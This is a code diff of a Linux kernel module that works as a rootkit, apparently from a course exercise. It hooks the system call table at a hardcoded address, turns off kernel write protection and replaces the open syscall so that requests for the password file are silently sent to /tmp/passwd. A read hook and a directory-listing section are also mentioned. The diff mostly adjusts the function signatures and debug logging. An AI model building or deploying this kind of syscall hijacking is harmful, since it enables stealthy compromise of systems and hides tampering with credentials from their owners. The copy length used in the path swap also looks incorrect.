@@ -55,24 +55,23 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 //The asmlinkage keyword is a GCC #define that indicates this function
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
-asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*original_call)(const char *pathname, int flags, mode_t mode);
 
 //Define our new sneaky version of the 'open' syscall
-asmlinkage int sneaky_sys_open(const char *pathname, int flags)
+asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
 {
   size_t passwd_size = sizeof(PASSWD)-1;
+  char * mychar = (char *) pathname;
   if (strncmp(pathname, PASSWD, passwd_size)==0) {
-    printk("These are the same!\n");
+    //printk(KERN_ALERT "These are the same!\n");
     const char * fake = "/tmp/passwd";
-    char * mychar = (char *) pathname;
-    printk("My original string is:%s!\n", pathname);
-    unsigned long result = copy_to_user((void __user *)mychar, (const void*) fake, sizeof(pathname)+1);
-    printk("My new string is:%s!\n", pathname);
-    printk("My result is:%lu!\n", result);
-    //copy fake string to pathname
+    //printk(KERN_ALERT "My original string is:%s!\n", pathname);
+    unsigned long result = copy_to_user(mychar, (const void*) fake, sizeof(pathname)+1);
+    //printk(KERN_ALERT "My new string is:%s!\n", mychar);
+    // printk(KERN_ALERT "My result is:%lu!\n", result);
   }
   
-  return original_call(pathname, flags);
+  return original_call(pathname, flags, mode);
 
 }
 
@@ -86,9 +85,6 @@ asmlinkage int sneaky_read(int fd, void *buf, size_t count)
   ssize_t ret = read_original(fd, buf, count);
   return ret;
 }
-
-
-
 
 
 //GETDENTS FUNCTIONS
@@ -200,7 +196,7 @@ static void exit_sneaky_module(void)
 {
   struct page *page_ptr;
 
-  //printk(KERN_INFO "Sneaky module being unloaded.\n"); 
+  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
